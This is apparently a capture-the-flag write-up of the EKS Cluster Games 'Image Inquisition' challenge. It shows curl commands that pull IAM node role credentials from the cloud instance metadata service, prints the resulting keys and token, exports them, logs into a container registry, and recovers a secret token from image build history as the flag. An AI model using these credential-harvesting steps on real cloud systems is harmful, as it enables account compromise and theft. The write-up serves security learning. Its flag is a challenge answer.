---
title: Image Inquisition - eksclustergames | 10 points
date: 2023-12-29 12:00:00 +100
categories: [eksclustergames, ctf, image-inquisition]
tags: [ctf, eksclustergames, image-inquisition]
---

# Challenge Description
>A pod's image holds more than just code. Dive deep into its ECR repository. Inspect the image layers, and uncover the hidden secret. You can also check the required K8s Cheat Sheet for this challenge within this page.
{: .prompt-info } 

If you check permissions, it's listed that we have `list and get pods` permissions. So, let's start with listing the pods.

>You can also check the permission using `kubectl` command as mentioned below.
```bash
root@wiz-eks-challenge:~# kubectl auth can-i list pod
yes
root@wiz-eks-challenge:~# kubectl auth can-i get pod
yes
```
{: .prompt-tip }

### List pods

```bash
root@wiz-eks-challenge:~# kubectl get pods
NAME                      READY   STATUS    RESTARTS      AGE
accounting-pod-876647f8   1/1     Running   1 (22d ago)   58d
```

As it's only one pod to focus, we can simply start with checking it's image (hint in the challenge description).

### Contianer Image

```bash
root@wiz-eks-challenge:~# kubectl get pods -o=jsonpath='{range .items[*]}{range .spec.containers[*]}{.image}{"\n"}{end}{end}'
688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
```

It's clear that the image is in ECR so obviously we need to run some AWS commands to go ahead.


```bash
root@wiz-eks-challenge:~# aws sts get-caller-identity

Unable to locate credentials. You can configure credentials by running "aws configure".
```

As the above command asked to login, we need to use the AWS Instance metadata service (IMDS) to get through it. Let's perform some required steps to login and get the Docker image from ECR.

### Instance Metadata Service (IMDS) to get IAM instance credentials

```bash
root@wiz-eks-challenge:~# curl http://169.254.169.254/latest/meta-data/iam/security-credentials
eks-challenge-cluster-nodegroup-NodeInstanceRole
```

### Get credentials

```bash
root@wiz-eks-challenge:~# curl -s 169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole | jq
{
  "AccessKeyId": "ASIA2AVYNEVM5QQU66N7",
  "Expiration": "2023-12-29 20:58:18+00:00",
  "SecretAccessKey": "8GFVVYgetRLMjTjjr0mQLLqCF9uNr0S7kSps+Mgn",
  "SessionToken": "FwoGZXIvYXdzEGUaDNIXeVNvbqF/NCkkdSK3AQiqCvidXKUztR2XOKM5t0iLlMLFlbjNiqd6pPjL6NrvTzZJ09e5TNmZ+Td1/mwvfVW9By5Tcrro0UHGTuLANkHR5klulXmAkCayYkiWtVXnKhAf6HMldwygnVX4Pygmd/k+y1lug+M7eeu6yLTUUBUSCkV+Fq0ofue4Bgz4ggxUTdIcu/NthDsVmucZX4AHsXIlCo8gc560vLK1b9P8i2cMIoVLKdeJLBUvxX80mAxsCdj2mZiRAijaybysBjItqjCqxmtmypWSBi/v354O9ziG5LqgzUldsGNBmJD1uOt1DxUs0qVy6VrUvfN/"
}
```

### Set AWS credential ENVs using inline bash command

```bash
root@wiz-eks-challenge:~# JSON="$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole)"; export AWS_ACCESS_KEY_ID="$(echo "$JSON" | jq -r .
AccessKeyId)"; export AWS_SECRET_ACCESS_KEY="$(echo "$JSON" | jq -r .SecretAccessKey)";export AWS_SESSION_TOKEN="$(echo "$JSON" | jq -r .SessionToken)";
```

### Confirm permission using `sts:GetCallerIdentity`

```bash
root@wiz-eks-challenge:~# aws sts get-caller-identity | jq
{
    "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"
}
```

### Login using AWS cli and Crane

```bash
root@wiz-eks-challenge:~# aws ecr get-login-password | crane auth login --username AWS --password-stdin 688655246681.dkr.ecr.us-west-1.amazonaws.com
2023/12/29 20:11:42 logged in via /home/user/.docker/config.json
```

>Pull image from ECR using `Crane` (pre-installed) else you can use `dive` also. 
```bash
crane pull "$(kubectl get pods -o=jsonpath='{range .items[*]}{range .spec.containers[*]}{.image}{"\n"}{end}{end}')" /tmp/image.tar
```
{: .prompt-tip }

Initially it was mentioned in this Challenge that, we need to check the image layers for getting the flag. For that, I chose `Crane` as it was mentioned that this tool is already installed else `dive` is also a nice choise for this.

### Check the config of the image

```bash
root@wiz-eks-challenge:~# crane config "$(kubectl get pods -o=jsonpath='{range .items[*]}{range .spec.containers[*]}{.image}{"\n"}{end}{end}')" | grep -i "wiz_eks_challenge"
{"architecture":"amd64","config":{"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],"Cmd":["/bin/sleep","3133337"],"ArgsEscaped":true,"OnBuild":null},"created":"2023-11-01T13:32:07.782534085Z","history":[{"created":"2023-07-18T23:19:33.538571854Z","created_by":"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "},{"created":"2023-07-18T23:19:33.655005962Z","created_by":"/bin/sh -c #(nop)  CMD [\"sh\"]","empty_layer":true},{"created":"2023-11-01T13:32:07.782534085Z","created_by":"RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{the_history_xx_xxxxxxxxx_xxxxx_xxxxx_reveal_the_secrets_to_the_future} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit","comment":"buildkit.dockerfile.v0"},{"created":"2023-11-01T13:32:07.782534085Z","created_by":"CMD [\"/bin/sleep\" \"3133337\"]","comment":"buildkit.dockerfile.v0","empty_layer":true}],"os":"linux","rootfs":{"type":"layers","diff_ids":["sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f","sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5"]}}
```

and the flag is

>wiz_eks_challenge{the_history_xx_xxxxxxxxx_xxxxx_xxxxx_reveal_the_secrets_to_the_future}
{: .prompt-info }
